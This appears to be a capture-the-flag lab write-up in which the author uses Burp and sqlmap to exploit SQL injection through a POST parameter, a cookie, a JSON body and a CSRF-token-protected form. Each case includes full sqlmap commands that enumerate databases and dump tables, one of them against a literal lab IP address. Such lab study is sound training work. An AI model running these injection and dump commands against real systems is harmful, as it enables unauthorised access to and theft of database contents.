## first task: + 1 What's the contents of table flag2? (Case #2) 
- First, I entered the website and saw that there was a field for entering the user ID in the database.
- I entered 1 and sent the query, capturing it with burp
- I saved the request to a text file and used sqlmap to examine the id parameter:
> sqlmap -r request.txt --batch
- sqlmap found a vulnerability so I started looking for the flag
- show the databases:
> sqlmap -u "http://<target>:<port>/case2.php" --data="id=1" --method=POST --dbs
- Select a database and view tables:
> sqlmap -u "http://<target>:<port>/case2.php" --data="id=1" -D nazwa_bazy --tables
- Dump data from table:
> sqlmap -u "http://<target>:<port>/case2.php" --data="id=1" -D nazwa_bazy -T flag2 --dump
- and I got a flag :)
##  What's the contents of table flag3? (Case #3) 
- Detect and exploit SQLi vulnerability in Cookie value id=1
- Vulnerability detection:
> sqlmap -u "http://target.com/" \
  --cookie="id=1" \
  --level=2 \
  --risk=2 \
  --batch \
  --flush-session
- show databases:
> sqlmap -u "http://target.com/" \
  --cookie="id=1" \
  --level=2 \
  --dbs \
  --current-db
- Exploring the selected database:
> sqlmap -u "http://target.com/" \
  --cookie="id=1" \
  -D nazwa_bazy \
  --tables
- Data dump from table:
> sqlmap -u "http://target.com/" \
  --cookie="id=1" \
  -D nazwa_bazy \
  -T users \
  --dump
- got a flag :)
## What's the contents of table flag4? (Case #4) 
- Detect and exploit SQLi vulnerability in JSON data {"id": 1}
- first I went to dev tools and copied the post task as curl
- I changed from curl to sqlmap with --dbs --tables
- After finding the vulnerability, I used this command to explore the database to find a flag
> sudo sqlmap 'http://<target>:<port>/case4.php' --compressed -X POST \
-H 'Content-Type: application/json' \ --data-raw '{"id":1*}' -D testdb -T flag4 --dump
- and got a flag ;)
- sqlmap -u "http://94.237.122.95:33765/case8.php/" \
  --method=POST \
  --data="id=1&t0ken=pSaEdJhxnKInXIrNxtunSTfc2JG5BPtRYKrUjxpvA" \
  -p id \
  --csrf-token="t0ken" \
  --csrf-url="http://94.237.122.95:33765/case8.php/" \
  --batch \
  --level=2 \
  --risk=2
- Detection and exploit SQLi vulnerability in POST parameter id, while taking care of the anti-CSRF protection command
